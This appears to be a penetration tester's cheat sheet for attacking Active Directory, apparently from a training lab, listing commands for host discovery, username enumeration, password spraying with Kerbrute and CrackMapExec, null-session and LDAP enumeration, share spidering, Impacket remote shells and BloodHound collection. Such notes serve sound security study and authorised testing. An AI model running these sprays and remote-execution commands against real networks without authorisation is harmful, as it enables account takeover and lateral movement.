## Scanning, Enumeration, Recon, External

Scan for live hosts on network
```
fping -asgq sub.net.ip/24
```

Kerbrute for internal AD username enumeration
```
sudo git clone https://github.com/ropnop/kerbrute.git
sudo make all
kerbrute userenum -d <domain.local> --dc <domain.ip.number> <usernametextfile-to-test> -o valid_ad_users.txt
```

Kerbrute can be used to password spray
```
/kerbrute_linux_amd64 passwordspray -d <lab.ropnop.com> <domain_users.txt> <Password123>
```

Password spray with Crackmapexec
```
crackmapexec smb <domain.ip> -u <user.list> -p <Password-to-try> //use --local-auth hen trying a local admin account
```

Windows domain spray internally - https://github.com/dafthack/DomainPasswordSpray
```
import-module domainpasswordspray.ps1
invoke-DomainPasswordSpray -password <password-to-try> -outfile <output.file> -errorAction silentlycontinue
```

Link for Kerbrute - https://github.com/ropnop/kerbrute

List of usernames - https://github.com/insidetrust/statistically-likely-usernames

Enumerate Password Policy with CME
```
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
crackmapexec smb 172.16.5.5 --users
```

rpcclient to check a Domain Controller for SMB NULL session access
```
rpcclient -U "" -N <domain.ip>
then querydomaininfo to check password policy
Can also use enumdomusers command
```

enum3linux can enumerate windows hosts and domains
```
enum4linux -P <domain.ip>
enum4linux -U <domain.ip>  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

enum4linux-ng is a rewrite and has additional features. -oA will output a JSON  and YAML file
```
enum4linux-ng -P <domain.ip> -oA save
```

Establish a null session on windows
```
net use \\DC01\ipc$ "" /u:""
```

LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. From Linux.
```
ldapsearch -h <dc.ip> -x -b "DC=<domain-name>,DC=<LOCAL>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
Getting users with LDAP Anonymous
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

Windapsearch can be userd to enumerate users, DA
```
windapsearch.py --dc-ip <172.16.5.5> -u "" -U
python3 windapsearch.py --dc-ip <172.16.5.5> -u <username>@<domainname.local> -p password --da //find domain admins
python3 windapsearch.py --dc-ip <172.16.5.5> -u <username>@<domainname.local> -p password --PU //find privileged users

```

## Initial Access

Enumerate users and spray passwords. Look for creds.

## Internal enumeration - Services, Accounts, Security Controls

Credentialed enumeration - We're interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more.

Crackmapexec for credentialed enumeration
```
sudo crackmapexec smb <domain.controller.ip> -u <username> -p <password> --users
sudo crackmapexec smb <domain.controller.ip> -u <username> -p <password> --groups
sudo crackmapexec smb <domain.controller.ip> -u <username> -p <password> --loggedon-users
sudo crackmapexec smb <domain.controller.ip> -u <username> -p <password> --shares
sudo crackmapexec smb <domain.controller.ip> -u <username> -p <password> -M spider_plus --share "Share name" //CME will write results into a json file at /tmp/cme_spider_plus/<ip of host>
```

SMBmap can be used to enumerate shares
```
smbmap -u <username> -p <password> -d <domainName.LOCAL> -H <domain.controller.ip>
smbmap -u <username> -p <password> -d <domainName.LOCAL> -H <domain.controller.ip> -R <Name of share> --dir-only //Recursively list directories
```

Impacket toolset
```
psexec.py <domainName.local>/<username>:<'password'>@<target.ip> //psexec requires a user with local admin privileges
wmiexec.py <domainName.local>/<username>:<'password'>@<target.ip> //not a fully interactive shell
```

Bloodhound - Once domain creds are obtained, you can run bloodhound
```
sudo bloodhound-python -u <'username'> -p <'password'> -ns <172.16.5.5> -d <domainname.local> -c all
sudo neo4j start
bloodhound
```


